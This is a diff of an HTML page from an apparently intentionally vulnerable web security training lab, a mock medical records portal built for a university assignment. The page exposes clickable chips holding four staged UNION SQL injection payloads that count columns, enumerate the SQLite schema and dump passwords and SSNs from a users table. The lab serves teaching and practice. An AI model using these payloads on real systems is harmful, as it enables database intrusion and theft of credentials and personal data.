@@ -3,99 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Electronic Medical Records — MedShield Health Portal</title>
+    <title>Medical Records — MedShield Health Portal</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <header>
         <div class="nav-container">
             <a href="index.html" class="brand">
-                <div class="brand-icon">
-                    <svg class="icon-svg" viewBox="0 0 24 24" style="stroke: #ffffff;">
-                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
-                    </svg>
-                </div>
-                <span>MedShield Clinical Portal</span>
+                <span class="brand-dot"></span>
+                <span>MedShield</span>
+                <span class="brand-badge">SecLab</span>
             </a>
             <nav>
                 <ul>
-                    <li><a href="index.html">Search (Reflected XSS)</a></li>
-                    <li><a href="login.html">Login (Easy SQLi)</a></li>
-                    <li><a href="records.html" class="active">Records (Advanced SQLi)</a></li>
-                    <li><a href="reviews.html">Reviews (Stored XSS)</a></li>
-                    <li><a href="department.html">Departments (DOM XSS)</a></li>
-                    <li><a href="profile.html">Profile (CSRF)</a></li>
+                    <li><a href="index.html">Reflected XSS</a></li>
+                    <li><a href="login.html">Easy SQLi</a></li>
+                    <li><a href="records.html" class="active">Advanced SQLi</a></li>
+                    <li><a href="reviews.html">Stored XSS</a></li>
+                    <li><a href="department.html">DOM XSS</a></li>
+                    <li><a href="profile.html">CSRF Target</a></li>
                 </ul>
             </nav>
             <div class="mode-control">
                 <span id="nav-mode-badge" class="mode-indicator vulnerable">
-                    <span class="status-dot"></span> VULNERABLE MODE
+                    <span class="status-dot"></span> VULNERABLE
                 </span>
-                <button id="toggle-mode-btn" class="btn-switch">Switch Mode</button>
+                <button id="toggle-mode-btn" class="btn-switch">Toggle Mode</button>
             </div>
         </div>
     </header>
 
     <main>
         <div class="card">
-            <div class="card-header">
-                <div>
-                    <h1 class="card-title">
-                        <svg class="icon-svg" viewBox="0 0 24 24" style="stroke: var(--primary);">
-                            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
-                            <polyline points="14 2 14 8 20 8"></polyline>
-                            <line x1="16" y1="13" x2="8" y2="13"></line>
-                            <line x1="16" y1="17" x2="8" y2="17"></line>
-                        </svg>
-                        Electronic Health Records (SQLi Level 3: Advanced)
-                    </h1>
-                    <p class="card-subtitle">
-                        Multi-stage structured UNION SQL injection attack chain: Column discovery, schema enumeration, and sensitive data extraction.
-                    </p>
+            <div class="card-header-row">
+                <div class="title-wrap">
+                    <h1 class="card-title">Electronic Health Records</h1>
+                    <span class="badge badge-purple">SQLi Level 3: UNION</span>
                 </div>
+                <span class="meta-route">Endpoint: GET /api/records?search=...</span>
             </div>
 
+            <p class="description">
+                Demonstrates structured multi-stage UNION SQL injection: Column discovery, table schema enumeration, and sensitive credential exfiltration.
+            </p>
+
             <form id="record-search-form" onsubmit="searchRecords(event)">
-                <div class="form-group">
-                    <label for="record-search">Filter Patient Health Records:</label>
-                    <div style="display: flex; gap: 0.75rem; flex-wrap: wrap;">
-                        <input type="text" id="record-search" placeholder="e.g. John Doe, Hypertension, or UNION SQLi payload..." style="flex: 1; min-width: 250px;" required>
-                        <button type="submit" class="btn btn-primary">Query Database</button>
-                    </div>
+                <div style="display: flex; gap: 0.65rem; align-items: center;">
+                    <input type="text" id="record-search" placeholder="Search patient records or execute UNION attack..." style="flex: 1;" required>
+                    <button type="submit" class="btn btn-primary">Query Records</button>
                 </div>
             </form>
 
             <!-- 4-Stage Attack Chain Chips -->
-            <div class="payload-helper">
-                <div class="payload-header">
-                    <svg class="icon-svg" viewBox="0 0 24 24" style="stroke: var(--text-secondary); width: 14px; height: 14px;">
-                        <polyline points="4 17 10 11 4 5"></polyline>
-                        <line x1="12" y1="19" x2="20" y2="19"></line>
-                    </svg>
-                    4-Stage Structured SQL Injection Payloads:
-                </div>
-                <div class="payload-chips">
-                    <span class="chip" data-target="record-search" data-payload="%' UNION SELECT 1, 2, 3, 4, 5, 6 --">
-                        Stage 1: Enumerate Column Count (6 Columns)
-                    </span>
-                    <span class="chip" data-target="record-search" data-payload="%' UNION SELECT 1, tbl_name, sql, 'SCHEMA', 5, 6 FROM sqlite_master WHERE type='table' --">
-                        Stage 2: Enumerate Tables (sqlite_master)
-                    </span>
-                    <span class="chip" data-target="record-search" data-payload="%' UNION SELECT 1, name, type, 'COLUMN_SPEC', 5, 6 FROM pragma_table_info('users') --">
-                        Stage 3: Enumerate Target Table Columns (users)
-                    </span>
-                    <span class="chip" data-target="record-search" data-payload="%' UNION SELECT id, username, password, email, role, ssn FROM users --">
-                        Stage 4: Exfiltrate Passwords & SSNs from users
-                    </span>
-                    <span class="chip" data-target="record-search" data-payload="Hypertension">
-                        Normal Search: Hypertension
-                    </span>
-                </div>
+            <div class="payload-strip">
+                <span class="payload-strip-label">Attack Stages:</span>
+                <span class="chip" data-target="record-search" data-payload="%' UNION SELECT 1, 2, 3, 4, 5, 6 --">
+                    Stage 1: Column Count (1..6)
+                </span>
+                <span class="chip" data-target="record-search" data-payload="%' UNION SELECT 1, tbl_name, sql, 'SCHEMA', 5, 6 FROM sqlite_master WHERE type='table' --">
+                    Stage 2: Table Schema (sqlite_master)
+                </span>
+                <span class="chip" data-target="record-search" data-payload="%' UNION SELECT 1, name, type, 'COLUMN_SPEC', 5, 6 FROM pragma_table_info('users') --">
+                    Stage 3: Column Discovery (users)
+                </span>
+                <span class="chip" data-target="record-search" data-payload="%' UNION SELECT id, username, password, email, role, ssn FROM users --">
+                    Stage 4: Dump Users & SSNs
+                </span>
+                <span class="chip" data-target="record-search" data-payload="Hypertension">
+                    Hypertension
+                </span>
             </div>
 
             <!-- Query Inspector -->
-            <div id="query-inspector" style="display: none; margin-top: 1.25rem;">
-                <label class="meta-label">Executed Backend SQL Statement:</label>
+            <div id="query-inspector" style="display: none; margin-top: 1rem;">
                 <div class="terminal-box" id="query-text"></div>
             </div>
 
@@ -119,7 +99,7 @@
     </main>
 
     <footer>
-        <p>MedShield Clinical Security Platform — Information Security Practical Assignment 2</p>
+        <p>MedShield Clinical Security Platform — Practical Assignment 2</p>
     </footer>
 
     <script src="app.js"></script>
@@ -156,12 +136,12 @@
                         <td><span style="${isDumpedUser ? 'color: #f87171; font-weight: 600; font-family: monospace;' : ''}">${r.doctor_name || '-'}</span></td>
                         <td>${r.diagnosis || '-'}</td>
                         <td>${r.treatment || '-'}</td>
-                        <td><span style="${isDumpedUser ? 'color: #facc15; font-weight: 600; font-family: monospace;' : ''}">${r.status || '-'}</span></td>
+                        <td><span style="${isDumpedUser ? 'color: #fcd34d; font-weight: 600; font-family: monospace;' : ''}">${r.status || '-'}</span></td>
                     `;
                     tbody.appendChild(row);
                 });
             } else {
-                tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 1.5rem;">No records matched query or query blocked by Safe Mode defense.</td></tr>`;
+                tbody.innerHTML = `<tr><td colspan="6" style="text-align: center; color: var(--text-muted); padding: 1.25rem;">No records matched query or query blocked by Safe Mode defense.</td></tr>`;
             }
         }
 
